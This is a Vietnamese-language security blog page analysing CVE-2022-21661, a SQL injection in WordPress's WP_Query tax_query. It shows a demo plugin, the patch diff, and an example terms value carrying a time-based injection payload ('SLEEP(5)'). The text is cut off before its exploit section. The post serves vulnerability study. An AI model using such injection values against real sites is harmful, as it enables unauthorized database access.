<!DOCTYPE html>
<html lang="vi">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>CVE-2022-21661 Analysis &amp; POC - w41bu1</title><meta name="Description" content="Security Vulnerability in WordPress Core."><meta property="og:url" content="http://localhost:1313/vi/2025-10-01-cve-2022-21661/">
  <meta property="og:site_name" content="w41bu1">
  <meta property="og:title" content="CVE-2022-21661 Analysis &amp; POC">
  <meta property="og:description" content="Security Vulnerability in WordPress Core.">
  <meta property="og:locale" content="vi">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-10-01T12:00:00+07:00">
    <meta property="article:modified_time" content="2025-10-01T12:00:00+07:00">
    <meta property="article:tag" content="Analyst">
    <meta property="article:tag" content="Plugin">
    <meta property="article:tag" content="Sqli">
    <meta property="og:image" content="http://localhost:1313/logo.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/logo.png">
  <meta name="twitter:title" content="CVE-2022-21661 Analysis &amp; POC">
  <meta name="twitter:description" content="Security Vulnerability in WordPress Core.">
<meta name="application-name" content="LoveIt">
<meta name="apple-mobile-web-app-title" content="LoveIt">
<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/vi/2025-10-01-cve-2022-21661/" /><link rel="prev" href="http://localhost:1313/vi/2025-09-30-cve-2025-2011/" /><link rel="next" href="http://localhost:1313/vi/2025-10-02-cve-2025-6234/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "CVE-2022-21661 Analysis \u0026 POC",
        "inLanguage": "vi",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/localhost:1313\/vi\/2025-10-01-cve-2022-21661\/"
        },"image": ["http:\/\/localhost:1313\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "analyst, plugin, sqli","wordcount":  1226 ,
        "url": "http:\/\/localhost:1313\/vi\/2025-10-01-cve-2022-21661\/","datePublished": "2025-10-01T12:00:00+07:00","dateModified": "2025-10-01T12:00:00+07:00","license": "Tác phẩm này được cấp phép theo Giấy phép Creative Commons Ghi công - Phi thương mại 4.0 Quốc tế.","publisher": {
            "@type": "Organization",
            "name": "w41bu1","logo": {
                    "@type": "ImageObject",
                    "url": "http:\/\/localhost:1313\/images\/avatar.jpeg",
                    "width":  736 ,
                    "height":  736 
                }},"author": {
                "@type": "Person",
                "name": "w41bu1"
            },"description": "Security Vulnerability in WordPress Core."
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
          const query = window.matchMedia('(prefers-color-scheme: dark)');
          function applyTheme() {
            let theme = window.localStorage?.getItem('theme') || 'auto';
            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
            document.body.setAttribute('theme', isDark? 'dark' : 'light');
            document.body.setAttribute('cfg-theme', theme);
          }

          applyTheme();
          query.addEventListener('change', applyTheme);
        </script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/vi/" title="w41bu1"><span class="header-title-pre"><i class='fa-solid fa-bug fa-fw' aria-hidden='true'></i></span>w41bu1</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/vi/posts/"> Posts </a><a class="menu-item" href="/vi/tags/"> Tags </a><a class="menu-item" href="/vi/categories/"> Categories </a><a class="menu-item" href="/vi/categories/documentation/"> Docs </a><a class="menu-item" href="/vi/about/"> About </a><a class="menu-item" href="https://github.com/dillonzq/LoveIt" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Tìm kiếm..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Tìm kiếm">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Xoá">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Đổi chủ đề">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a><a href="javascript:void(0);" class="menu-item language" title="Chọn Ngôn ngữ">
                    <i class="fa fa-globe fa-fw" aria-hidden="true"></i>                      
                    <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/2025-10-01-cve-2022-21661/">English</option><option value="/vi/2025-10-01-cve-2022-21661/" selected>Vietnamese</option></select>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/vi/" title="w41bu1"><span class="header-title-pre"><i class='fa-solid fa-bug fa-fw' aria-hidden='true'></i></span>w41bu1</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Tìm kiếm..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Tìm kiếm">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Xoá">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Huỷ
                    </a>
                </div><a class="menu-item" href="/vi/posts/" title="">Posts</a><a class="menu-item" href="/vi/tags/" title="">Tags</a><a class="menu-item" href="/vi/categories/" title="">Categories</a><a class="menu-item" href="/vi/categories/documentation/" title="">Docs</a><a class="menu-item" href="/vi/about/" title="">About</a><a class="menu-item" href="https://github.com/dillonzq/LoveIt" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Đổi chủ đề">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a><a href="javascript:void(0);" class="menu-item" title="Chọn Ngôn ngữ">
                    <i class="fa fa-globe fa-fw" aria-hidden="true"></i>
                    <select class="language-select" onchange="location = this.value;"><option value="/2025-10-01-cve-2022-21661/">English</option><option value="/vi/2025-10-01-cve-2022-21661/" selected>Vietnamese</option></select>
                </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Nội dung</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CVE-2022-21661 Analysis & POC</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://w41bu1.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>w41bu1</a></span>&nbsp;<span class="post-category">trong <a href="/vi/categories/cve-analyst/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>CVE Analyst</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-10-01">2025-10-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1226 từ&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 phút&nbsp;</div>
        </div><div class="featured-image"><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/2025-10-01-cve-2022-21661/app.png"
        data-srcset="/2025-10-01-cve-2022-21661/app.png, /2025-10-01-cve-2022-21661/app.png 1.5x, /2025-10-01-cve-2022-21661/app.png 2x"
        data-sizes="auto"
        alt="/2025-10-01-cve-2022-21661/app.png"
        title="Security Vulnerability in WordPress Core." width="2560" height="1440" /></div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Nội dung</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#setup">Setup</a>
      <ul>
        <li><a href="#required-php-version">Required PHP Version</a></li>
        <li><a href="#vscode-extensions">VSCode Extensions</a></li>
        <li><a href="#custom-plugin">Custom Plugin</a></li>
      </ul>
    </li>
    <li><a href="#analysis">Analysis</a>
      <ul>
        <li><a href="#patch-diff">Patch Diff</a></li>
        <li><a href="#how-it-work">How it work?</a>
          <ul>
            <li><a href="#flow">Flow</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#exploit">Exploit</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#references">References</a></li>
    <li><a href="#notes">Notes</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><hr>
<p>Do việc làm sạch dữ liệu (<strong>sanitization</strong>) không đúng cách trong <code>WP_Query</code>, có những trường hợp có thể xảy ra <strong>SQL Injection</strong> thông qua các <strong>plugin</strong> hoặc <strong>theme</strong> sử dụng nó theo một cách nhất định. Lỗ hổng này đã được vá trong WordPress phiên bản <strong>5.8.3</strong>. Các phiên bản cũ hơn bị ảnh hưởng cũng đã được sửa thông qua bản phát hành bảo mật, quay ngược lại đến tận phiên bản <strong>3.7.37</strong>.</p>
<ul>
<li><strong>CVE ID</strong>: <a href="https://www.cve.org/CVERecord?id=CVE-2022-21661" target="_blank" rel="noopener noreffer ">CVE-2022-21661</a></li>
<li><strong>Product</strong>: <a href="https://wordpress.org/" target="_blank" rel="noopener noreffer ">WordPress</a></li>
<li><strong>Vulnerability Type</strong>: SQL Injection</li>
<li><strong>Affected Versions</strong>: <code>3.7.37 ≤ version &lt; 5.8.3</code></li>
<li><strong>CVSS severity</strong>:  High (8.0)</li>
</ul>
<hr>
<h2 id="requirements">Requirements</h2>
<ul>
<li><a href="https://w41bu1.github.io/posts/wordpress-local-and-debugging/" target="_blank" rel="noopener noreffer "><strong>Local WordPress and Debugging</strong></a></li>
<li><strong>WordPress</strong>: v5.8.2(vul)</li>
</ul>
<hr>
<h2 id="setup">Setup</h2>
<h3 id="required-php-version">Required PHP Version</h3>
<p>WordPress được xây dựng hoàn toàn bằng PHP, vì vậy phiên bản PHP trên máy chủ có ảnh hưởng trực tiếp đến khả năng hoạt động của WordPress:</p>
<ul>
<li>Mỗi phiên bản PHP đều bổ sung tính năng mới và loại bỏ dần các hàm/cú pháp lỗi thời.</li>
<li>Nếu WordPress dùng tính năng mới nhưng PHP trên server quá cũ =&gt; sẽ phát sinh lỗi cú pháp (syntax error) hoặc không chạy được.</li>
<li>Ngược lại, nếu PHP quá mới, một số hàm cũ mà WordPress vẫn còn sử dụng có thể đã deprecated hoặc bị loại bỏ hoàn toàn, gây lỗi khi chạy.</li>
</ul>
<p>👉 Do đó, cần lựa chọn phiên bản PHP tương thích với phiên bản WordPress. Trong phân tích này, ta sử dụng PHP <strong>7.4</strong> để cài đặt WordPress <strong>5.8.2</strong>.</p>
<h3 id="vscode-extensions">VSCode Extensions</h3>
<p>WordPress có mã nguồn phức tạp, nên việc đọc từng dòng code thủ công là không khả thi. Để hỗ trợ quá trình <strong>debug</strong> và <strong>truy vết</strong>, ta cần cài đặt thêm hai extension sau trong VS Code:</p>
<ul>
<li><strong>PHP Extension Pack</strong> =&gt; tìm bằng từ khóa: <code>xdebug.php-pack</code></li>
<li><strong>PHP Tools</strong> for VS Code =&gt; tìm bằng từ khóa: <code>devsense.phptools-vscode</code></li>
</ul>
<h3 id="custom-plugin">Custom Plugin</h3>
<p>Vì lỗ hổng SQLi này ảnh hưởng đến <strong>WordPress Core</strong>, nhưng chỉ có thể khai thác gián tiếp thông qua <strong>plugin</strong> hoặc <strong>theme</strong> sử dụng <code>WP_Query</code>, nên ta cần thông qua một <strong>plugin</strong> hoặc <strong>theme</strong> để tạo tương tác với <strong>WP_Query</strong>.</p>
<p>Ta xây dựng <strong>plugin</strong> sử dụng <code>WP_Query</code>, hiển thị query được thực thi thông qua <code>WP_Query::request</code>.</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-php">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd"> * Plugin Name: Demo WP_Query
</span></span></span><span class="line"><span class="cl"><span class="sd"> * Description: Plugin demo WP_Query
</span></span></span><span class="line"><span class="cl"><span class="sd"> * Version: 1.0
</span></span></span><span class="line"><span class="cl"><span class="sd"> * Author: w41bu1
</span></span></span><span class="line"><span class="cl"><span class="sd"> */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">defined</span><span class="p">(</span><span class="s1">&#39;ABSPATH&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">da_show_posts</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$args</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;post_type&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;post&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;tax_query&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="p">[</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;taxonomy&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;category&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;field&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;term_taxonomy_id&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;terms&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;operator&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;IN&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$query</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WP_Query</span><span class="p">(</span><span class="nv">$args</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">ob_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;h3&gt;Demo WP_Query&lt;/h3&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;pre style=&#34;background:#f0f0f0; padding:15px; width:100%; white-space:pre-wrap; word-wrap:break-word; overflow:auto;&#34;&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;SQL query generated by WP_Query:</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">esc_html</span><span class="p">(</span><span class="nv">$query</span><span class="o">-&gt;</span><span class="na">request</span><span class="p">);</span> <span class="c1">// Display executed query 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">echo</span> <span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$query</span><span class="o">-&gt;</span><span class="na">have_posts</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;ul&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">(</span><span class="nv">$query</span><span class="o">-&gt;</span><span class="na">have_posts</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$query</span><span class="o">-&gt;</span><span class="na">the_post</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;li&gt;&#39;</span> <span class="o">.</span> <span class="nx">get_the_title</span><span class="p">()</span> <span class="o">.</span> <span class="s1">&#39; (&#39;</span> <span class="o">.</span> <span class="nx">get_the_ID</span><span class="p">()</span> <span class="o">.</span> <span class="s1">&#39;)&lt;/li&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;/ul&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;p&gt;No posts found.&lt;/p&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">wp_reset_postdata</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">ob_get_clean</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">add_shortcode</span><span class="p">(</span><span class="s1">&#39;demo_wp_query&#39;</span><span class="p">,</span> <span class="s1">&#39;da_show_posts&#39;</span><span class="p">);</span></span></span></code></pre></div></div>
<p><a href="https://developer.wordpress.org/reference/classes/wp_query/#taxonomy-parameters" target="_blank" rel="noopener noreffer ">Taxonomy parameters</a></p>
<p>Tạo page mới với <code>&lt;page-title&gt;</code> có <strong>shortcode</strong> :</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>[demo_wp_query]</code></pre></div>
<p>👉 Truy vấn sẽ được hiển thị khi truy cập <code>http://localhost/&lt;page-title&gt;</code></p>
<p><figure><a class="lightgallery" href="/2025-10-01-cve-2022-21661/demo_page.png" title="demo page" data-thumbnail="/2025-10-01-cve-2022-21661/demo_page.png" data-sub-html="<h2>Trang demo hiển thị kết quả WP_Query</h2><p>demo page</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-01-cve-2022-21661/demo_page.png"
            data-srcset="/2025-10-01-cve-2022-21661/demo_page.png, /2025-10-01-cve-2022-21661/demo_page.png 1.5x, /2025-10-01-cve-2022-21661/demo_page.png 2x"
            data-sizes="auto"
            alt="/2025-10-01-cve-2022-21661/demo_page.png" width="1306" height="895" />
    </a><figcaption class="image-caption">Trang demo hiển thị kết quả WP_Query</figcaption>
    </figure></p>
<hr>
<h2 id="analysis">Analysis</h2>
<p><strong>wpdb</strong></p>
<ul>
<li>Là lớp PHP cốt lõi của WordPress dùng để thao tác trực tiếp với MySQL.</li>
<li>Cho phép lập trình viên <strong>viết và thực thi câu SQL thô</strong>.</li>
</ul>
<p><strong>WP_Query</strong></p>
<ul>
<li>Là một lớp trừu tượng hóa giúp lấy dữ liệu bài viết (post) từ database mà <strong>không cần viết SQL trực tiếp</strong>.</li>
<li>Lập trình viên chỉ cần truyền vào mảng tham số (args), WordPress sẽ tự động dựng câu SQL phù hợp.</li>
</ul>
<p><strong>Mối quan hệ</strong></p>
<ul>
<li>WP_Query không trực tiếp truy vấn MySQL.</li>
<li>Thay vào đó, nó xây dựng câu SQL dựa trên args, áp dụng các bước <strong>kiểm tra</strong>/<strong>validate</strong>, rồi gọi <code>$wpdb</code> để thực thi.</li>
</ul>
<h3 id="patch-diff">Patch Diff</h3>
<p>WordPress là một dự án <strong>mã nguồn mở</strong> với kho lưu trữ được công khai trên <strong>GitHub</strong>. Vì vậy, mọi bản vá đều được commit trực tiếp tại đây. Do đó, để phân tích một lỗ hổng, ta chỉ cần tìm đến commit liên quan và quan sát sự thay đổi trong mã nguồn.</p>
<p>Trong phần reference của <strong>CVE-2022-21661</strong>, có liên kết đến <a href="https://github.com/WordPress/wordpress-develop/commit/17efac8c8ec64555eff5cf51a3eff81e06317214" target="_blank" rel="noopener noreffer ">commit</a> trên GitHub:</p>
<p><figure><a class="lightgallery" href="/2025-10-01-cve-2022-21661/patch_diff.png" title="Patch Diff" data-thumbnail="/2025-10-01-cve-2022-21661/patch_diff.png" data-sub-html="<h2>So sánh bản vá giữa hai phiên bản</h2><p>Patch Diff</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-01-cve-2022-21661/patch_diff.png"
            data-srcset="/2025-10-01-cve-2022-21661/patch_diff.png, /2025-10-01-cve-2022-21661/patch_diff.png 1.5x, /2025-10-01-cve-2022-21661/patch_diff.png 2x"
            data-sizes="auto"
            alt="/2025-10-01-cve-2022-21661/patch_diff.png" width="830" height="389" />
    </a><figcaption class="image-caption">So sánh bản vá giữa hai phiên bản</figcaption>
    </figure></p>
<p>Lỗ hổng được vá trong file <strong>src/wp-includes/class-wp-tax-query.php</strong></p>
<p><strong>Bản lỗi</strong></p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-php">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$query</span><span class="p">[</span><span class="s1">&#39;terms&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">array_unique</span><span class="p">(</span> <span class="p">(</span><span class="k">array</span><span class="p">)</span> <span class="nv">$query</span><span class="p">[</span><span class="s1">&#39;terms&#39;</span><span class="p">]</span> <span class="p">);</span></span></span></code></pre></div></div>
<ul>
<li>Ép <code>$query['terms']</code> thành mảng và loại bỏ giá trị trùng lặp.</li>
<li>Không có bước kiểm tra hoặc ép kiểu dữ liệu, dẫn đến nguy cơ chèn dữ liệu không hợp lệ vào truy vấn SQL.</li>
</ul>
<p>Ví dụ:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-php">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$args</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;post_type&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;post&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;tax_query&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;taxonomy&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;category&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;field&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;term_taxonomy_id&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;terms&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s1">&#39;1) AND (SELECT SLEEP(5)) # &#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;operator&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;IN&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">],</span>
</span></span><span class="line"><span class="cl"><span class="p">];</span></span></span></code></pre></div></div>
<p><strong>Bản vá</strong></p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-php">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="s1">&#39;slug&#39;</span> <span class="o">===</span> <span class="nv">$query</span><span class="p">[</span><span class="s1">&#39;field&#39;</span><span class="p">]</span> <span class="o">||</span> <span class="s1">&#39;name&#39;</span> <span class="o">===</span> <span class="nv">$query</span><span class="p">[</span><span class="s1">&#39;field&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$query</span><span class="p">[</span><span class="s1">&#39;terms&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">array_unique</span><span class="p">(</span> <span class="p">(</span><span class="k">array</span><span class="p">)</span> <span class="nv">$query</span><span class="p">[</span><span class="s1">&#39;terms&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$query</span><span class="p">[</span><span class="s1">&#39;terms&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">wp_parse_id_list</span><span class="p">(</span> <span class="nv">$query</span><span class="p">[</span><span class="s1">&#39;terms&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<ul>
<li>
<p>Bổ sung điều kiện dựa vào <code>$query['field']</code>:</p>
<ul>
<li>Nếu là <strong>slug</strong> hoặc <strong>name</strong> =&gt; giữ nguyên cách xử lý cũ.</li>
<li>Nếu là <strong>ID</strong> =&gt; dùng <code>wp_parse_id_list()</code> để ép kiểu dữ liệu thành mảng số nguyên an toàn.</li>
</ul>
</li>
</ul>
<blockquote>
<p>Ta biết đây là bước ép kiểu dữ liệu thành mảng số nguyên bởi vì trong <code>tax_query</code><sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>, tham số <code>field</code> chỉ nhận 4 giá trị: <code>slug</code>, <code>name</code>, <code>term_taxonomy_id</code> và <code>term_id</code>. Trong đó, hai trường <code>term_taxonomy_id</code> và <code>term_id</code> thuộc bảng <code>wp_term_taxonomy</code> và đều có kiểu dữ liệu <strong>BIGINT UNSIGNED</strong>.</p>
</blockquote>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
